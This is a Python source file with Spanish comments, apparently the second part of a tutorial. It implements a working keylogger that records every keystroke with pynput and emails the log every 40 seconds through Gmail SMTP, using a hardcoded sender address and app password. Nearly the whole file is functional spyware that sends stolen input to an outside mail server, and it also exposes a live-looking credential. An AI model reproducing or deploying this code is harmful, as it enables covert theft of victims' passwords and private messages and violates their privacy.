# Segunda parte

#!/usr/bin/env python3

import sys
import signal
import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText



class Keylogger: # Clase

    def __init__(self): # contructor
        self.log = ""
        self.request_shutdown = False # para verificar la salida del keyloger 
        self.timer = None # Para dar la accion de cancelar el timer.cancel()
        self.firs_msg_run = True # Para partir dando el mensaje de inicio ya que se enviara un mensaje al primer momento sin ningun log
    def pressed_key(self, key): # metodo

        try:
            self.log += str(key.char) # al ATRIBUTO self.log se le esta agregando la key que seria el evento de tecla formatiado a string ya que en un principio es un evento


        except AttributeError:
            special_charc = {key.space: " ", key.shift: " SHIFT ", key.backspace: " BACKSPACE ", key.alt: " ALT ", key.enter: " ENTER ", key.ctrl: " CTRL ", }

            self.log += special_charc.get(key, f"{str(key)}")

        print(self.log) # esto se saca para que no se vean los logs por cosola.

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print(f"\n¡¡ Email sent Successefully !!")

    def report(self):
        email_body = "The Keylogger Activate" if self.firs_msg_run else self.log
        self.send_email("Keyloger Report", email_body, "zmksec23@gmail.com", ["zmksec23@gmail.com"], "vydw hnoh fgeg ulma")
        self.log = ""
        if self.firs_msg_run:
            self.firs_msg_run = False
        if not self.request_shutdown:

            self.timer = threading.Timer(40, self.report)
            self.timer.start()


    def start(self):

        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) # aqui se crea el evento de cada tecla con pynput

        with keyboard_listener:


            self.report()
            keyboard_listener.join()


    def shutdown(self):

        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()